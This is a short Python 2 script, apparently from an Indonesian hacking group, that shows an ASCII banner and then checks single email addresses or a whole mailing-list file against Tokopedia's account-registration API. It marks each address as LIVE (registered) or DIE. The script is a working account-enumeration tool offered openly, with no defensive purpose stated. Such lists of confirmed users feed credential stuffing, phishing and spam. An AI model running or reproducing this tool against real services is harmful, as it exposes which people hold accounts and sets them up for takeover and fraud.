# /usr/lib/python
# Kirnath x ZeroByte.ID

import requests
import threading
import sys
import time

class warna:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
merah = "\033[01;31m{0}\033[00m"
hijau = "\033[01;35m{0}\033[00m"

w 		= merah.format(" _   ___                  _   _     \n")
gans 	= merah.format("| | / (_)                | | | |    \n")
sangat 	= merah.format("| |/ / _ _ __ _ __   __ _| |_| |__  \n")
kirnath = merah.format("|    \| | '__| '_ \ / _` | __| '_ \ \n")
coded 	= merah.format("| |\  \ | |  | | | | (_| | |_| | | |\n")
me 		= merah.format("\_| \_/_|_|  |_| |_|\__,_|\__|_| |_|\n")
exit = "[========]"
for l in w:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.005)
for l in gans:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.005)
for l in sangat:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.005)
for l in coded:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.005)
for l in me:
	sys.stdout.write(l)
	sys.stdout.flush()
	time.sleep(0.005)
print hijau.format("                       ZeroByte.ID\n")

def main():
	if "_" not in me:
		sys.exit()
	else:
		print "\n1.Single Check\n2.Mass Check"
		mana = int(raw_input("Select Service: "))
		if mana == 2:
			filebos = str(raw_input("Input Mailist: "))
			openfile = open(filebos, 'r')
			read = openfile.read().split('\n')
			for i in read:
				data = {'email': i}
				cek = requests.post('https://accounts.tokopedia.com/api/v1/account/register/email/check',data=data)
				respon = str(cek.text)
				if "true" in respon:
					print warna.OKGREEN + "[LIVE] ",i + warna.ENDC
				else:
					print warna.FAIL + "[DIE] ",i + warna.ENDC
		if mana == 1:
			email = str(raw_input("Email: "))
			data = {'email': email}
			cek = requests.post('https://accounts.tokopedia.com/api/v1/account/register/email/check',data=data)
			respon = str(cek.text)
			if "true" in respon:
				print warna.OKGREEN + "[LIVE] ",email + warna.ENDC
			else:
				print warna.FAIL + "[DIE] ",email + warna.ENDC
t=threading.Thread(target=main)
t.start()
